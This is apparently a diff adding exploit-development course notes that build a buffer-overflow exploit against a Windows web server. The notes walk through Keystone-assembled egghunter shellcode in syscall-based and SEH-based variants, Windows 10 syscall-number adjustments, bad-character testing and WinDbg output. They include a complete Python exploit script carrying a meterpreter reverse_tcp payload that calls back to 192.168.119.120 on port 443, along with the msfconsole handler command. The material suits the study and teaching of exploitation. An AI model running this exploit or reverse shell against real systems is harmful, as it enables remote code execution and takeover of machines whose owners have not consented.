+Because we are attacking a web server, we could add an additional buffer after the first carriage return (`\r`) and new-line (`\n`)
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+  size = 253
+
+  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
+  inputBuffer = b"\x41" * size
+  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
+  httpEndRequest = b"\r\n"
+  httpEndRequest+= b"w00tw00t" + b"\x44" * 400
+  httpEndRequest+= b"\r\n\r\n"
+
+  buf = httpMethod + inputBuffer +  httpEndRequest
+...
+```
+
+Running the PoC does **not** seem to cause our application to crash.
+
+Send the buffer after we end our HTTP request:
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+  size = 253
+
+  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
+  inputBuffer = b"\x41" * size
+  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
+  httpEndRequest = b"\r\n\r\n"
+
+  shellcode = b"w00tw00t" + b"\x44" * 400
+
+  buf = httpMethod + inputBuffer +  httpEndRequest + shellcode
+...
+```
+
+`s -a 0x0 L?80000000 w00tw00t`
+
+```
+01365a5e  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD
+```
+
+`db 01365a5e + 0n408 - 4 L4`
+
+```
+01365bf2    44 44 44 44     DDDD
+```
+
+We were able to store the entire buffer
+
+Inspect the memory address to determine in which region it is located and its properties.
+
+`!teb`
+
+```
+TEB at 7ffdb000
+    ExceptionList:        016cff70
+    StackBase:            016d0000
+    StackLimit:           016cc000
+    SubSystemTib:         00000000
+    ...
+```
+
+The address is not located on our current stack.
+
+Display information about a specific memory address
+
+`!address 01365a5e`
+
+```
+Usage:                  Heap
+Base Address:           01360000
+End Address:            0136f000
+Region Size:            0000f000 (  60.000 kB)
+State:                  00001000          MEM_COMMIT
+Protect:                00000004          PAGE_READWRITE
+Type:                   00020000          MEM_PRIVATE
+Allocation Base:        01360000
+Allocation Protect:     00000004          PAGE_READWRITE
+More info:              heap owning the address: !heap 0x1360000
+More info:              heap segment
+More info:              heap entry containing the address: !heap -x 0x1365a5e
+
+Content source: 1 (target), length: 5a2
+```
+
+The memory address where our buffer is stored is on the heap
+
+## The Windows Heap Memory Manager
+
+Heap Manager is a software layer that resides on top of the virtual memory interfaces provided by the Windows OS.
+
+This software layer allows applications to dynamically request and release memory through a set of Windows APIs (`VirtualAllocEx, VirtualFreeEx, HeapAlloc, and HeapFree`). These APIs will eventually call into their respective native functions in `ntdll.dll` (`RtlAllocateHeap and RtlFreeHeap`).
+
+In Windows OS, when a process starts, the Heap Manager automatically creates a new heap called the **default process heap**.
+
+Although some processes only use the default process heap, many will create additional heaps using the `HeapCreate` API (or its lower-level interface `ntdll!RtlCreateHeap`) to isolate different components running in the process itself.
+
+Other processes make substantial use of the C Runtime heap for most dynamic allocations (`malloc / free` functions). These heap implementations, defined as NT Heap, eventually make use of the Windows Heap Manager functions in `ntdll.dll` to interface with the kernel Windows Virtual Memory Manager and to allocate memory dynamically.
+
+Because our secondary buffer is stored in **dynamic** memory, there's no way to determine its location beforehand.
+
+=> No possibility of adding a **static offset** to our current instruction pointer to reach our secondary buffer.
+
+## Finding our Buffer - The Egghunter Approach
+
+To find the memory address of another buffer under our control that is not static, we often use an Egghunter.
+
+A small first-stage payload that can search the process virtual address space (VAS) for an egg, a unique tag that prepends the payload we want to execute.
+
+Once the egg is found, the egghunter transfers the execution to the final shellcode by jumping to the found address.
+
+Since egghunters are often used when dealing with space restrictions, they are written to be as small as possible. 
+
+These type of payloads also need to **handle access violations** that are raised while scanning the virtual address space.
+
+The access violations usually occur while attempting to access an unmapped memory address or addresses we don't have access to.
+
+### Keystone Engine
+
+Keystone Engine is an assembler framework with bindings for several languages, including Python.
+
+With it, simply write our ASM code in a Python script.
+
+```bash
+sudo apt install python3-pip
+pip install keystone-engine
+```
+
+#### keystone_0x01.py
+
+```bash
+python3 keystone_0x01.py
+```
+Opcodes = ("\x31\xc0\x01\xc8\x50\x5e")
+
+```python
+from keystone import *
+
+CODE = (
+"                        " 
+" start:                 "
+"     xor eax, eax      ;" 
+"     add eax, ecx      ;" 
+"     push eax          ;" 
+"     pop esi           ;" 
+)
+
+# Initialize engine in 32-bit mode
+ks = Ks(KS_ARCH_X86, KS_MODE_32)
+encoding, count = ks.asm(CODE)
+instructions = ""
+for dec in encoding: 
+    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
+  
+print("Opcodes = (\"" + instructions + "\")")
+```
+
+```bash
+msf-nasm_shell 
+
+nasm > xor eax,eax
+00000000  31C0              xor eax,eax
+
+nasm > add eax,ecx
+00000000  01C8              add eax,ecx
+
+nasm > push eax
+00000000  50                push eax
+
+nasm > pop esi
+00000000  5E                pop esi
+```
+
+### System Calls and Egghunters
+
+Rather than crawling the memory inside our program and risking an access violation, we'll use a **system call** and have the OS access a specific memory address.
+
+By using the `NtAccessCheckAndAuditAlarm` system call, we will only get 2 results back.
+
+1. If the memory page is valid and we have appropriate access, the system call will return `STATUS_NO_IMPERSONATION_TOKEN` (`0xc000005c`).
+
+2. Attempting to access an unmapped memory page or one without appropriate access will result in a `STATUS_ACCESS_VIOLATION` (`0xc0000005`) code. 
+
+The `NtAccessCheckAndAuditAlarm` Windows system call will work without issues in the egghunter unless we are running in the context of a thread that is **impersonating a client**.
+
+A **system call** is an interface between a user-mode process and the kernel.
+
+Invoking a system call is usually done through a dedicated assembly instruction or an **interrupt** (also known as a **trap** or **exception**).
+
+Before invoking a system call, the OS needs to know the function it should call and the arguments that are passed to it.
+
+- On the x86 architecture, the function can be specified by setting up a unique **System Call Number** in the `EAX` register that matches a specific function.
+
+- If the function is invoked through a system call, after pushing the arguments individually on the stack, we'll move the stack pointer (`ESP`) to the `EDX` register, which is passed to the system call.
+
+As part of the system call, the OS will try to access the memory address where the function arguments are stored (to copy them from user-space to kernel-space).
+
+If `EDX` points to an unmapped memory address or one we can't access due to lack of appropriate permissions, the OS will trigger an access violation, which it will handle for us and return the `STATUS_ACCESS_VIOLATION` code in `EAX` (allowing our egghunter to continue to the next **memory page**).
+
+`python3 original_egghunter.py`
+
+```
+egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
+```
+
+```python
+from keystone import *
+
+CODE = (
+		# We use the edx register as a memory page counter
+"							 " 
+"	loop_inc_page:			 "
+		# Go to the last address in the memory page
+"		or dx, 0x0fff		;" 
+"	loop_inc_one:			 "
+		# Increase the memory counter by one
+"		inc edx				;"
+"	loop_check:				 "
+		# Save the edx register which holds our memory 
+		# address on the stack
+"		push edx			;"
+		# Push the system call number
+"		push 0x2 			;" 
+		# Initialize the call to NtAccessCheckAndAuditAlarm
+"		pop eax				;" 
+		# Perform the system call
+"		int 0x2e			;" 
+		# Check for access violation, 0xc0000005 
+		# (ACCESS_VIOLATION)
+"		cmp al,05			;" 
+		# Restore the edx register to check later 
+		# for our egg
+"		pop edx				;" 
+"	loop_check_valid:		 "
+		# If access violation encountered, go to n
+		# ext page
+"		je loop_inc_page	;" 
+"	is_egg:					 "
+		# Load egg (w00t in this example) into 
+		# the eax register
+"		mov eax, 0x74303077	;" 
+		# Initializes pointer with current checked 
+		# address 
+"		mov edi, edx		;" 
+		# Compare eax with doubleword at edi and 
+		# set status flags
+"		scasd				;" 
+		# No match, we will increase our memory 
+		# counter by one
+"		jnz loop_inc_one	;" 
+		# First part of the egg detected, check for 
+		# the second part
+"		scasd				;" 
+		# No match, we found just a location 
+		# with half an egg
+"		jnz loop_inc_one	;" 
+"	matched:				 "
+		# The edi register points to the first 
+		# byte of our buffer, we can jump to it
+"		jmp edi				;" 
+)
+
+# Initialize engine in 32bit mode
+ks = Ks(KS_ARCH_X86, KS_MODE_32)
+encoding, count = ks.asm(CODE)
+egghunter = ""
+for dec in encoding: 
+  egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")
+  
+print("egghunter = (\"" + egghunter + "\")")
+```
+
+The `OR` operation on the `DX` register will make `EDX` point to the **last address of a memory page** > An `INC` instruction, which effectively sets `EDX` to a **new memory page**.
+
+The `loop_check` function:
+
+- While we don't need the `PUSH EDX` instruction for the execution of the system call, pushing it on the stack allows us to restore it later on.
+
+- Push the system call number (`0x02`) and then perform a `POP` instruction to pop the system call number from the stack into `EAX`.
+
+- Now that we have the system call number in `EAX` and a fake pointer to our arguments in `EDX`, we can invoke the system call using `INT 0x2E`, which results in a trap. Microsoft designed the OS to treat this exception as a system call.
+
+At this point, the OS will check the memory pointer from `EDX` to gather the function arguments. If accessing the memory address from `EDX` causes an access violation, we will get the `STATUS_ACCESS_VIOLATION` (`0xc0000005`) result in `EAX`.
+
+To avoid null bytes, rather than checking for the entire DWORD, our egghunter simply performs a `CMP` between the `AL` register and the value `0x05`.
+
+`POP EDX` will restore our memory address from the stack back into the `EDX` register.
+
+This is followed by a conditional jump based on the result of our previous comparison.
+
+- If a `STATUS_ACCESS_VIOLATION` was found, we move on to the next memory page by jumping to the beginning of our egghunter and repeating the previous steps.
+
+- If the memory page is mapped, or we have the appropriate access, we continue to check for our unique signature (egg).
+
+Our egghunter using a `MOV` instruction to move the hex value of our egg in `EAX` and move our memory address from `EDX` to `EDI`.
+
+`SCASD` will compare the value stored in `EAX` with the first DWORD that the memory address from `EDI` is pointing to. Then it will automatically increment `EDI` by a DWORD.
+
+- If the first DWORD of our egg is not found, then we jump back, increase the memory address by one, and repeat the process.
+
+- If found, we use the `SCASD` instruction again to check for the second DWORD of our egg.
+
+If the second entry matches, i.e. we have found our buffer and `EDI` points right after our egg. => redirect the execution flow with a `JMP` instruction.
+
+The original code from Matt Miller used the `NtDisplayString` system call, exploiting the very same concept.
+
+However,  `NtAccessCheckAndAuditAlarm` system call number (`0x02`) didn't change across different OSs versions, compared to the one for `NtDisplayString`.
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+  size = 253
+
+  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
+
+  egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
+               b"\x66\x81\xca\xff\x0f\x42\x52\x6a"
+               b"\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
+               b"\xef\xb8\x77\x30\x30\x74\x89\xd7"
+               b"\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
+
+  inputBuffer = b"\x41" * (size - len(egghunter))
+  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
+  httpEndRequest = b"\r\n\r\n"
+
+  shellcode = b"w00tw00t" + b"\x44" * 400
+
+  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode
+...
+```
+
+Set a breakpoint at our `POP EAX; RET` instruction sequence. Once our breakpoint is hit, we will execute until a branch is taken
+
+`ph`
+
+```
+02f0ea88 0f8411000000    je      02f0ea9f
+```
+
+`u 02f0ea9f L16`
+
+```
+02f0ea9f 90              nop
+02f0eaa0 90              nop
+02f0eaa1 90              nop
+02f0eaa2 90              nop
+02f0eaa3 90              nop
+02f0eaa4 90              nop
+02f0eaa5 6681caff0f      or      dx,0FFFh
+02f0eaaa 42              inc     edx
+02f0eaab 52              push    edx
+02f0eaac 6a02            push    2
+02f0eaae 58              pop     eax
+02f0eaaf cd2e            int     2Eh
+02f0eab1 3c05            cmp     al,5
+02f0eab3 5a              pop     edx
+02f0eab4 74ef            je      02f0eaa5
+02f0eab6 b877303074      mov     eax,74303077h
+02f0eabb 89d7            mov     edi,edx
+02f0eabd af              scas    dword ptr es:[edi]
+02f0eabe 75ea            jne     02f0eaaa
+02f0eac0 af              scas    dword ptr es:[edi]
+02f0eac1 75e7            jne     02f0eaaa
+02f0eac3 ffe7            jmp     edi
+```
+
+Our egghunter code is present in memory and appears to be intact.
+
+Confirm that the egghunter has been stored in memory without being mangled.
+
+`s -a 0x0 L?80000000 w00tw00t`
+
+Our egghunter is still running but it does not seem to find our secondary buffer.
+
+While we can find plenty of exploits publicly available that include this egghunter, it appears that they are all targeting applications on **Windows 7 or prior**.
+
+=> Some changes occurred in between Windows 7 and Windows 10 that break the functionality of our egghunter.
+
+Set a breakpoint at the `INT 0x2E` instruction
+
+`bp 02ffeaaf`
+
+`g`
+
+```
+edx=77185000
+02ffeaaf cd2e            int     2Eh
+```
+
+`p`
+
+```
+eax=c0000005
+02ffeab1 3c05            cmp     al,5
+```
+
+`dc 77185000`
+
+Inspecting the memory addresses shows that they are mapped and we can read the contents of the memory.
+
+Hardcoding system call numbers are prone to change across different versions of the OS.
+
+Before Windows 8, `NtAccessCheckAndAuditAlarm`'s system call number was always `0x02`. With the release of Windows 10, the system call numbers often change with every update.
+
+Updating the system call number
+
+`u ntdll!NtAccessCheckAndAuditAlarm`
+
+```
+ntdll!NtAccessCheckAndAuditAlarm:
+76f20ec0 b8c6010000      mov     eax,1C6h
+76f20ec5 e803000000      call    ntdll!NtAccessCheckAndAuditAlarm+0xd (76f20ecd)
+76f20eca c22c00          ret     2Ch
+76f20ecd 8bd4            mov     edx,esp
+76f20ecf 0f34            sysenter
+76f20ed1 c3              ret
+...
+```
+
+The system call number for our version of Windows is `0x1C6`. 
+
+`python3 original_egghunter_win10.py`
+
+```
+egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x68\xc6\x01\x00\x00\x58\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7")
+```
+
+Replacing our `PUSH 0x02` instruction with `PUSH 0x1C6` results in null bytes.
+
+=> `NEG` assembly instruction
+
+`? 0x00 - 0x1C6`
+
+```
+Evaluate expression: -454 = fffffe3a
+```
+
+```python
+...
+"	loop_check:				 "
+		# Save the edx register which holds our memory 
+		# address on the stack
+"		push edx			;"
+		# Push the negative value of the system 
+		# call number
+"		mov eax, 0xfffffe3a	;" 
+		# Initialize the call to NtAccessCheckAndAuditAlarm
+"		neg eax				;" 
+		# Perform the system call
+"		int 0x2e			;" 
+		# Check for access violation, 0xc0000005 
+		# (ACCESS_VIOLATION)
+"		cmp al,05			;" 
+		# Restore the edx register to check 
+		# later for our egg
+"		pop edx				;" 
+...
+```
+
+We successfully located our secondary buffer.
+
+### Obtaining a Shell
+
+Checking for bad characters in our secondary buffer
+
+```python
+...
+  inputBuffer = b"\x41" * (size - len(egghunter))
+  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
+  httpEndRequest = b"\r\n\r\n"
+
+  badchars = (
+    b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
+    b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
+    b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
+    b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
+    b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
+    b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
+    b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
+    b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
+    b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
+    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
+    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
+    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
+    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
+    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
+    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
+    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
+    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
+    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
+    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+  shellcode = b"w00tw00t" + badchars + b"\x44" * (400-len(badchars))
+
+  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode
+...
+```
+
+`s -a 0x0 L?80000000 w00tw00t`
+
+We do not appear to have any bad characters in our secondary buffer.
+
+#### System call-based egghunter
+
+```python
+#!/usr/bin/python
+import socket
+import sys
+from struct import pack
+
+try:
+    server = sys.argv[1]
+    port = 80
+    size = 253
+
+    httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
+
+    egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
+                b"\x66\x81\xca\xff\x0f\x42\x52\xb8"
+                b"\x3a\xfe\xff\xff\xf7\xd8\xcd\x2e"
+                b"\x3c\x05\x5a\x74\xeb\xb8\x77\x30"
+                b"\x30\x74\x89\xd7\xaf\x75\xe6\xaf"
+                b"\x75\xe3\xff\xe7")
+
+    inputBuffer = b"\x41" * (size - len(egghunter))
+    inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
+    httpEndRequest = b"\r\n\r\n"
+
+    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python -v  payload
+
+    payload =  b""
+    payload += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b"
+    ...
+    payload += b"\xff\xd5"
+
+    shellcode = b"w00tw00t" + payload + b"\x44" * (400-len(payload))
+
+    buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode
+
+    print("Sending evil buffer...")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, port))
+    s.send(buf)
+    s.close()
+    
+    print("Done!")
+  
+except socket.error:
+    print("Could not connect!")
+```
+
+```bash
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.120; set LPORT 443; exploit"
+```
+
+## Improving the Egghunter Portability Using SEH
+
+Rather than relying on the OS, create and install our own structured exception handler to handle accessing invalid memory pages to increase the portability of our egghunter.
+
+Because the underlying SEH mechanism has not changed drastically from earlier versions of Windows.
+
+The downside: a larger egghunter requires additional assembly instructions to set up the SEH mechanism. (~60 bytes > 35 byrs)
+
+`python3 egghunter_seh_original.py`
+
+```
+Encoded 35 instructions...
+egghunter = ("\xeb\x21\x59\xb8\x77\x30\x30\x74\x51\x6a\xff\x31\xdb\x64\x89\x23\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3")
+```
+
+```python
+from keystone import *
+
+CODE = (
+"	start: 									 "
+		# jump to a negative call to dynamically 
+		# obtain egghunter position
+"		jmp get_seh_address 				;" 
+"	build_exception_record: 				 "
+		# pop the address of the exception_handler 
+		# into ecx
+"		pop ecx 							;" 
+		# mov signature into eax
+"		mov eax, 0x74303077 				;" 
+		# push Handler of the 
+		# _EXCEPTION_REGISTRATION_RECORD structure
+"		push ecx 							;" 
+		# push Next of the 
+		# _EXCEPTION_REGISTRATION_RECORD structure
+"		push 0xffffffff 					;" 
+		# null out ebx
+"		xor ebx, ebx 						;" 
+		# overwrite ExceptionList in the TEB with a pointer
+		# to our new _EXCEPTION_REGISTRATION_RECORD structure
+"		mov dword ptr fs:[ebx], esp 		;" 
+"	is_egg: 								 "
+		# push 0x02
+"		push 0x02 							;" 
+		# pop the value into ecx which will act 
+		# as a counter
+"		pop ecx 							;" 
+		# mov memory address into edi
+"		mov edi, ebx 						;" 
+		# check for our signature, if the page is invalid we 
+		# trigger an exception and jump to our exception_handler function
+"		repe scasd 							;" 
+		# if we didn't find signature, increase ebx 
+		# and repeat
+"		jnz loop_inc_one 					;"  
+		# we found our signature and will jump to it
+"		jmp edi 							;" 
+"	loop_inc_page: 							 " 
+		# if page is invalid the exception_handler will 
+		# update eip to point here and we move to next page
+"		or bx, 0xfff 						;" 
+"	loop_inc_one: 							 "
+		# increase ebx by one byte
+"		inc ebx 							;" 
+		# check for signature again
+"		jmp is_egg 							;" 
+"	get_seh_address: 						 "
+		# call to a higher address to avoid null bytes & push 
+		# return to obtain egghunter position
+"		call build_exception_record 		;" 
+		# push 0x0c onto the stack
+"		push 0x0c 							;" 
+		# pop the value into ecx
+"		pop ecx 							;" 
+		# mov into eax the pointer to the CONTEXT 
+		# structure for our exception
+"		mov eax, [esp+ecx] 					;" 
+		# mov 0xb8 into ecx which will act as an 
+		# offset to the eip
+"		mov cl, 0xb8						;" 
+		# increase the value of eip by 0x06 in our CONTEXT 
+		# so it points to the "or bx, 0xfff" instruction 
+		# to increase the memory page
+"		add dword ptr ds:[eax+ecx], 0x06	;" 
+		# save return value into eax
+"		pop eax 							;" 
+		# increase esp to clean the stack for our call
+"		add esp, 0x10 						;" 
+		# push return value back into the stack
+"		push eax 							;" 
+		# null out eax to simulate 
+		# ExceptionContinueExecution return
+"		xor eax, eax 						;" 
+		# return
+"		ret 								;" 
+)
+
+# Initialize engine in X86-32bit mode
+ks = Ks(KS_ARCH_X86, KS_MODE_32)
+encoding, count = ks.asm(CODE)
+print("Encoded %d instructions..." % count)
+
+egghunter = ""
+for dec in encoding: 
+  egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
+print("egghunter = (\"" + egghunter + "\")")
+```
+
+In `get_seh_address`, the 1st instruction is a **relative** `CALL` to the `build_exception_record` function.
+
+When executing a relative call, the opcodes will match the **offset** from the current value of `EIP`. This would normally generate **null byte**s unless we perform a **backward call** using a negative offset.
+
+By executing a `CALL` instruction, we will push the **return value** to the stack.
+ 
+The `build_exception_record` function:
+
+- `pop ecx`  will store the return value pushed to the stack by our previous CALL into ECX.
+
+- Our egg is moved into the `EAX` register.
+
+Building our own `_EXCEPTION_REGISTRATION_RECORD` structure:
+
+- Push the value stored in `ECX`, which holds our **return address** pointing to the next instruction after our `CALL` to `build_exception_record`. This will act as the `Handler` member of the `_EXCEPTION_REGISTRATION_RECORD` structure.
+
+- Push the value of "-1" (`0xffffffff`) as our `Next` member. This signals the end of the singly-linked list storing the exception records.
+
+- Installs the custom exception handler by overwriting the `ExceptionList` member in the `TEB` structure with our stack pointer.
+
+The next functions (`is_egg`, `loop_inc_page`, and `loop_inc_one`) are meant to search for our egg in memory.
+
+Rather than executing the `SCASD` operation twice, use the `REPE` instruction with the counter stored in `ECX` to minimize the size of the egghunter.
+
+The access violation will be triggered on the `REPE SCASD` instruction.
+
+Because an access violation means that the memory page is not valid, => our exception handler to restore execution at the `loop_inc_page` function.
+
+The prototype of the `_except_handler` function.
+
+```C
+typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
+    IN PEXCEPTION_RECORD ExceptionRecord,  
+    IN VOID EstablisherFrame,  
+    IN OUT PCONTEXT ContextRecord,  
+    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
+);
+```
+
+Whenever an exception occurs, the OS will invoke our `_except_handler` and pass the 4 parameters to the stack.
+
+The parameter `ContextRecord` points to a `CONTEXT` structure. At the moment the exception occurs, all register values are stored in this structure.
+
+`dt ntdll!_CONTEXT`
+
+At offset `0xB8` from the beginning of the CONTEXT structure, we find the `Eip` member. This member stores the memory address pointing to the instruction that caused the access violation.
+
+=> Resume the execution flow at the `loop_inc_page` function to move to the next memory page.
+
+An `_EXCEPTION_DISPOSITION` structure containing 44 members, each of them acting as a return value.
+
+`dt _EXCEPTION_DISPOSITION`
+
+```
+ntdll!_EXCEPTION_DISPOSITION
+   ExceptionContinueExecution = 0n0
+   ExceptionContinueSearch = 0n1
+   ExceptionNestedException = 0n2
+   ExceptionCollidedUnwind = 0n3
+```
+
+To gracefully continue the execution, use the `ExceptionContinueExecution` return value (`0x00`) to signal that the exception has been successfully handled.
+
+When the exception is triggered and our function is executed:
+
+- Retrieve the `ContextRecord` parameter from the stack at offset `0x0C` (because it is the 3rd argument).
+
+- Dereference the `ContextRecord` address at offset `0xB8` to obtain the `Eip` member.
+
+- Align it to the `loop_inc_page` function with arithmetic operations.
+
+- Save the return address in `EAX` and increase the stack pointer past the arguments.
+
+- Push the previously-stored return address back on the stack and null out `EAX` to signal that the exception has been successfully handled.
+
+- Execute a return instruction, which will take us back to the `loop_inc_page` function.
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+  size = 253
+
+  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
+
+  egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
+               b"\xeb\x21\x59\xb8\x77\x30\x30\x74"
+               b"\x51\x6a\xff\x31\xdb\x64\x89\x23"
+               b"\x6a\x02\x59\x89\xdf\xf3\xaf\x75"
+               b"\x07\xff\xe7\x66\x81\xcb\xff\x0f"
+               b"\x43\xeb\xed\xe8\xda\xff\xff\xff"
+               b"\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8"
+               b"\x83\x04\x08\x06\x58\x83\xc4\x10"
+               b"\x50\x31\xc0\xc3")
+
+  inputBuffer = b"\x41" * (size - len(egghunter))
+  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
+  httpEndRequest = b"\r\n\r\n"
+...
+```
+
+`t`
+
+```
+0307eaba f3af            repe scas dword ptr es:[edi]
+```
+
+`dd edi`
+
+```
+00000000  ???????? ???????? ???????? ????????
+00000010  ???????? ???????? ???????? ????????
+00000020  ???????? ???????? ???????? ????????
+00000030  ???????? ???????? ???????? ????????
+```
+
+`!exchain`
+
+```
+0307ea2c: 0307eacd
+Invalid exception stack at ffffffff
+```
+
+`u 0307eacd`
+
+```
+0307eacd 6a0c            push    0Ch
+0307eacf 59              pop     ecx
+0307ead0 8b040c          mov     eax,dword ptr [esp+ecx]
+0307ead3 b1b8            mov     cl,0B8h
+0307ead5 83040806        add     dword ptr [eax+ecx],6
+0307ead9 58              pop     eax
+0307eada 83c410          add     esp,10h
+0307eadd 50              push    eax
+```
+
+Set a breakpoint at the address of our _except_handler function and let the execution resume
+
+`bp 0307eacd`
+
+`g`
+
+Unfortunately, we never reach our `_except_handler` function. When we resume execution, we trigger the access violation again.
+
+### Identifying the SEH-Based Egghunter Issue
+
+Open `ntdll.dll` in IDA `C:\Installers\egghunter\ntdll.idb`
+
+when an exception is raised, a call to `ntdll!KiUserExceptionDispatcher` is made. This function will then call `RtlDispatchException`, which will retrieve the `ExceptionList` and parse it.
+
+`bp ntdll!RtlDispatchException`
+
+While going through the code blocks of the `RtlDispatchException` function, we find a call to `RtlpGetStackLimits`.
+
+`RtlpGetStackLimits` is used to retrieve the current stack limits.
+
+The `TEB` structure contains the `StackBase` and `StackLimit` values, and `ExceptionList`.
+
+`dt _NT_TIB`
+
+```
+ntdll!_NT_TIB
+   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD
+   +0x004 StackBase        : Ptr32 Void
+   +0x008 StackLimit       : Ptr32 Void
+   +0x00c SubSystemTib     : Ptr32 Void
+   +0x010 FiberData        : Ptr32 Void
+   +0x010 Version          : Uint4B
+   +0x014 ArbitraryUserPointer : Ptr32 Void
+   +0x018 Self             : Ptr32 _NT_TIB
+```
+
+We find a call to `RtlIsValidHandle`, which is responsible for various checks including the SafeSEH implementation.
+
+When we continue our inspection of other code blocks, we aren't able to find another call to this function.
+
+=> We have to reach this particular code block to successfully call our custom `_except_handler` function.
+
+To reach the `RtlIsValidHandle` call, we have to pass the following checks:
+
+1.	The memory address of our `_EXCEPTION_REGISTRATION_RECORD` structure needs to be higher than the `StackLimit`.
+
+2.	The memory address of our `_EXCEPTION_REGISTRATION_RECORD` structure plus `0x08` needs to be lower than the `StackBase`.
+
+3.	The memory address of our `_EXCEPTION_REGISTRATION_RECORD` structure needs to be aligned to the 4 bytes boundary.
+
+4.	The memory address of our `_except_handler` function needs to be located at a higher address than the `StackBase`.
+
+=>
+
+1. Pass. Because our egghunter code pushed the custom `_EXCEPTION_REGISTRATION_RECORD` structure onto the stack and then overwrote the `ExceptionList` with the value of the ESP register.
+
+2. Pass. Since we pushed the `_EXCEPTION_REGISTRATION_RECORD` structure on the stack. The reason it adds `0x08` bytes from the `_EXCEPTION_REGISTRATION_RECORD` structure is due to its size, which contains 2 DWORD-sized members.
+ 
+3. Pass. Given that we have not performed any arithmetic operations on ESP, we have maintained the alignment. (By default, the OS and compilers ensure that the stack, as well as other classes and structure members, are aligned accordingly.)
+
+4. Failed. Because the `_except_handler` function is implemented in the egghunter located on the stack.
+
+=> we will not reach the call to `RtlIsValidHandle`.
+
